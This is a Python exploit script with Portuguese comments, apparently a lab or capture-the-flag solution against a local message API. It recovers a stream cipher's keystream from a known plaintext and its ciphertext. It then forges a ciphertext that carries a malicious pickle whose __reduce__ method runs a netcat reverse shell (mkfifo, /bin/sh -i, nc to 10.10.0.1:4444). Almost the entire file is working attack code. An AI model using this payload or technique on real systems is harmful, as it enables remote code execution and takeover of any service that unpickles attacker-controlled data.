import requests
import pickle
import base64
import os

def manipulate_ciphertext(ciphertext, known_plaintext, new_plaintext):
    """
    Takes an original ciphertext and known plaintext, along with a new plaintext.
    Returns a new ciphertext corresponding to the new plaintext without needing the key.
    """
    if len(ciphertext) != len(known_plaintext) or len(known_plaintext) != len(new_plaintext):
        raise ValueError("Ciphertext, known plaintext, and new plaintext must be the same length.")
    
    manipulated_ciphertext = bytes([c ^ kp ^ np for c, kp, np in zip(ciphertext, known_plaintext, new_plaintext)])
    return manipulated_ciphertext


class RCE:
    ip: str
    port: int
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               f'/bin/sh -i 2>&1 | nc {self.ip} {self.port} > /tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':

    # 3. Gerar um payload válido;
    pwned = RCE()
    pwned.ip = "10.10.0.1"
    pwned.port = 4444
    payload = pickled = pickle.dumps(pwned)
    
    # 1. Gerar uma mensagem cifrada a parir de um texto conhecido;
    plaintext = str("Z" * (len(payload)))

    response = requests.post(
        "http://localhost/api/message/", json={"content": plaintext}
    )
    uuid = response.json()["uuid"]

    # 2. Obter a chave da cifra de fluo realizando uma operação XOR entre o
    # cifrotexto do passo anterior e o texto plano usado para gerá-lo;
    response = requests.get(f"http://localhost/api/message/{uuid}/")
    ciphertext = base64.urlsafe_b64decode(response.content)

    # 4. Cifrar o payload usando a chave da cifra de fluxo obtida no passo 2 a
    # partir de uma oepração XOR.
    evil = manipulate_ciphertext(ciphertext[:len(payload)], plaintext.encode()[:len(payload)], payload)
    
    print(base64.urlsafe_b64encode(evil).decode())